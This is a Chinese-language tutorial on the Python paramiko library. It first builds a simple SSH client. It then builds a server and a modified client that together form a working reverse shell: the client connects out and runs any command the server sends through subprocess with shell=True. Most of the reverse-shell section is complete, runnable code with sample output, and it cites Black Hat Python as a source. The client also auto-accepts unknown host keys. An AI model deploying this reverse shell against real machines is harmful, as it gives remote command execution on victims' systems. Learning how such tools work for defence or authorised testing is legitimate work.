# Paramiko模块(by bt3)

**Paramiko**非常棒!!!它使用了我最喜欢的[PyCrypto](https://www.dlitz.net/software/pycrypto/)，使我们能够使用[SSH2协议](http://en.wikipedia.org/wiki/SSH2)，它可以是我们自由而轻易地使用API。

你将亲眼看到这些内容：在这篇文章中你将看到使用SSH连接客户端和服务器的代码，反弹shell，以及隧道连接，并且，它将是顺利而有趣的！

我们可以开始了吗？

---

## 一个简单的SSH客户端

我们要写的第一个程序是一个SSH客户端，它需要和一个可用的SSH服务器连接，然后执行接收到的简单的命令。

但是在我们开始之前，确保**paramiko**已经安装在了环境中：

```sh
$ sudo pip install paramiko
```

###  写SSH客户端脚本
现在我们要开始写脚本了。我们将从一个**usage**函数开始。 function. 由于**paramiko**支持使用密码和/或身份文件（密钥）进行身份验证，我们的usage函数将表示出当运行这个脚本时，我们将如何发送这些变量（还包括端口号，用户名，以及我们想要运行的命令）：

```python
def usage():
    print "Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD> -k <KEY> -c <COMMAND>"
    print "  -a                  password authentication"
    print "  -i                  identity file location"
    print "  -c                  command to be issued"
    print "  -p                  specify the port"
    print "  -u                  specify the username"
    print
    print "Examples:"
    print "ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c pwd"
    sys.exit()
```

现在来看**main**函数，我们将使用**getopt**模块来解析参数。主函数基本有以下功能：解析参数，将它们发送给**ssh_client**函数：

```python
import paramiko
import sys
import getopt

def main():
    if not len(sys.argv[1:]):
        usage()

    IP = '0.0.0.0'
    USER = ''
    PASSWORD = ''
    KEY = ''
    COMMAND = ''
    PORT = 0

    try:
        opts = getopt.getopt(sys.argv[2:],"p:u:a:i:c:", \
            ["PORT", "USER", "PASSWORD", "KEY", "COMMAND"])[0]
    except getopt.GetoptError as err:
        print str(err)
        usage()

    IP = sys.argv[1]
    print "[*] Initializing connection to " + IP

    # Handle the options and arguments
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-i'):
            KEY = t[1]
        elif t[0] in ('-c'):
            COMMAND = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print "This option does not exist!"
            usage()
    if USER:
        print "[*] User set to " + USER
    if PORT:
        print "[*] The port to be used is %d. " % PORT
    if PASSWORD:
        print "[*] A password with length %d was submitted. " %len(PASSWORD)
    if KEY:
        print "[*] The key at %s will be used." % KEY
    if COMMAND:
        print "[*] Executing the command '%s' in the host..." % COMMAND
    else:
        print "You need to specify the command to the host."
        usage()

    # start the client
    ssh_client(IP, PORT, USER, PASSWORD, KEY, COMMAND)

if __name__ == '__main__':
    main()
```

奇迹发生在**ssh_client**函数中，它将按照如下步骤运行：

1. 创建一个paramiko的ssh连接的client对象。
2. 检测密钥变量是否非空，如果非空，加载它。如果没有找到密钥，程序将接收SSH服务器的SSH密钥（如果不这样做，我们会发现在known_hosts中找不到服务器）。
3. 建立连接并创建会话。
4. 检测会话是否可用并运行我们发送的命令。

我们来看如何用代码实现这个过程：

```python
def ssh_client(ip, port, user, passwd, key, command):
    client = paramiko.SSHClient()

    if key:
        client.load_host_keys(key)
    else:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.exec_command(command)
        print
        print ssh_session.recv(4096)
```

很简单，对吧？

### 运行这个脚本

我们已经可以运行脚本了。如果我们使用usage函数中的例子（假设这个帐户存在与主机中），我们将会看到下面的结果：
```sh
$ ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c pwd
[*] Initializing connection to 129.49.76.26
[*] User set to buffy
[*] The port to be used is 22.
[*] A password with length 12 was submitted.
[*] Executing the command 'pwd' in the host...

/home/buffy.
```

-----

## 一个SSH服务器来反弹客户端shell

要是我们可以控制SSH服务器向SSH客户端发送信息呢？这就是我们即将要做的：我们将要为这个服务器写一个**类**（简单利用一下**socket**模块，然后我们就可以**反弹shell**！


提示一下，这个脚本基于一些[paramiko示例](https://github.com/paramiko/paramiko/blob/master/demo)，并且我们将使用他们的样本文件中的密钥([点此下载](https://github.com/paramiko/paramiko/blob/master/demos/test_rsa.key)).


### SSH服务器

在我们的服务器脚本中，我们将创建一个**Server**类来开启一个新的线程，以检测会话是否有效，进行认证。注意为了简便我们将硬编码用户名，密码和主机密钥，这不是一个好的做法：

```python
HOST_KEY = paramiko.RSAKey(filename='test_rsa.key')
USERNAME = 'buffy'
PASSWORD = 'killvampires'

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == USERNAME) and (password == PASSWORD):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
```

现在，让我们看一下**main**函数，它将完成以下步骤：

1. 创建一个socket的对象来连接主机和端口，这样它可以监听即将进行的连接。
2. 一旦连接建立（客户端想要与服务器连接，socket接受这个连接），它将为这个socket建立一个**paramiko**传输对象(在paramiko中有两种主要的通信方式：*transport*，建立并维持这个加密连接；*channel*，为加密会话提供发送/接受数据的通道）。
3. 这个程序初始化一个**Server**对象，并且使用它开启一个paramiko会话。
4. 尝试认证。如果认证成功，我们将得到**ClientConnected**信息。
5. 服务器开始一个循环，重复的接受输入命令，并在客户端中运行。这就是我们的反弹shell！

```python
import paramiko
import getopt
import threading
import sys
import socket

def main():
    if not len(sys.argv[1:]):
        print "Usage: ssh_server.py <SERVER>  <PORT>"
        sys.exit(0)

    # creating a socket object
    server = sys.argv[1]
    ssh_port = int(sys.argv[2])
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print "[+] Listening for connection ..."
        client, addr = sock.accept()
    except Exception, e:
        print "[-] Connection Failed: " + str(e)
        sys.exit(1)
    print "[+] Connection Established!"

    # creating a paramiko object
    try:
        Session = paramiko.Transport(client)
        Session.add_server_key(HOST_KEY)
        paramiko.util.log_to_file("filename.log")
        server = Server()
        try:
            Session.start_server(server=server)
        except paramiko.SSHException, x:
            print '[-] SSH negotiation failed.'
        chan = Session.accept(10)
        print '[+] Authenticated!'
        chan.send("Welcome to Buffy's SSH")
        while 1:
            try:
                command = raw_input("Enter command: ").strip('\n')
                if command != 'exit':
                    chan.send(command)
                    print chan.recv(1024) + '\n'
                else:
                    chan.send('exit')
                    print '[*] Exiting ...'
                    session.close()
                    raise Exception('exit')
            except KeyboardInterrupt:
                session.close()

    except Exception, e:
        print "[-] Caught exception: " + str(e)
        try:
            session.close()
        except:
            pass
        sys.exit(1)

if __name__ == '__main__':
    main()
```



### SSH客户端

得到我们的反弹shell的最后一个步骤就是使得SSH客户端可以接收来自服务器端的命令。

我们将要调整原来的客户端脚本以接收命令。我们所需要做的就是在会话中添加一个循环：

```python
import paramiko
import sys
import getopt
import subprocess

def usage():
    print "Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD>"
    print "  -a                  password authentication"
    print "  -p                  specify the port"
    print "  -u                  specify the username"
    print
    print "Examples:"
    print "ssh_client.py localhost -u buffy -p 22 -a killvampires"
    sys.exit()

def ssh_client(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print ssh_session.recv(1024)
        while 1:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()

def main():
    if not len(sys.argv[1:]):
        usage()
    IP = '0.0.0.0'
    USER = ''
    PASSWORD = ''
    PORT = 0
    try:
        opts = getopt.getopt(sys.argv[2:],"p:u:a:", \
            ["PORT", "USER", "PASSWORD"])[0]
    except getopt.GetoptError as err:
        print str(err)
        usage()
    IP = sys.argv[1]
    print "[*] Initializing connection to " + IP
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print "This option does not exist!"
            usage()
    if USER:
        print "[*] User set to " + USER
    if PORT:
        print "[*] The port to be used is %d. " % PORT
    if PASSWORD:
        print "[*] A password with length %d was submitted. " %len(PASSWORD)
    ssh_client(IP, PORT, USER, PASSWORD)

if __name__ == '__main__':
    main()
```

### 运行这两个脚本
让我们分别在不同的终端中运行这两个脚本，首先运行服务器脚本：
```bash
$ ssh_server.py localhost 22
[+] Listening for connection ...
```

然后运行客户端脚本：
```sh
$ ssh_client_reverse.py localhost -p 22 -u buffy -a killvampires
[*] Initializing connection to localhost
[*] User set to buffy
[*] The port to be used is 22.
[*] A password with length 12 was submitted.
Welcome to Buffy's SSH
```

现在我们可以从服务器端向客户端发送需要执行的命令：我们得到了一个反弹shell！

```sh
[+] Listening for connection ...
[+] Connection Established!
[+] Authenticated!
Enter command: ls
filename.log
ssh_client.py
ssh_client_reverse.py
ssh_server.py
test_rsa.key

Enter command:
```

**Awesomesauce!**

 啊，顺便说一下，这些脚本不仅在Linux中可以运行，在Windows和Mac中也可以（因此，下次当你使用一个没用的windows环境时，不需要安装[Putty](http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html) anymore =p ).

---

## 更多相关资料：

- [Paramikos reverse SSH tunneling](https://github.com/paramiko/paramiko/blob/master/demos/rforward.py).
- [Black Hat Python](http://www.nostarch.com/blackhatpython).
- [My Gray hat repo](https://github.com/bt3gl/My-Gray-Hacker-Resources).
